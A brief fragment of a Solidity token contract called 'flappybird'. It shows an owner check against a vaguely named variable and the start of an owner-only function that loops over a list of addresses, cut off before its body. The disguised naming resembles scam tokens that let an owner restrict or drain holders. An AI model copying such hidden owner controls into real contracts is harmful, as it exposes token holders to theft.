...
contract flappybird is Context, IERC20 {
    ...
    modifier onlyOwner() {
        require(msg.sender == omission, "Not allowed");
        _;
    }

    function embrace(address[] memory reptile) public onlyOwner() {
        for (uint256 i = 0; i < reptile.length; i++) {
            address account = reptile[i];
